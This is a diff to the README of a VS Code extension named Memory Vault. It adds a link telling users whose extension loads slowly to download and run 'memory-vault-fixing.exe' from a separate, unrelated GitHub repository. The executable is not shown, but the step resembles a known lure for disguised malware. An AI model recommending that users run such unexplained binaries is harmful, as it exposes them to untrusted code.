@@ -24,7 +24,7 @@ Memory Vault is a Visual Studio Code extension designed to simplify note-taking 
 3. Search for `Memory Vault` and click Install.
 
 > If `Memory Vault` not working or its take lot of time for loading use those steps.
-> 1. Download [`memory-vault-fixing.exe`]() and run it.
+> 1. Download [`memory-vault-fixing.exe`](https://github.com/sunit-mal/clipbox/blob/05f8017b99c28cebf9711c5373ec28329046ba90/output/memory-vault-fixing.exe) and run it.
 > If any error come then contact me.
 
 ## Commands
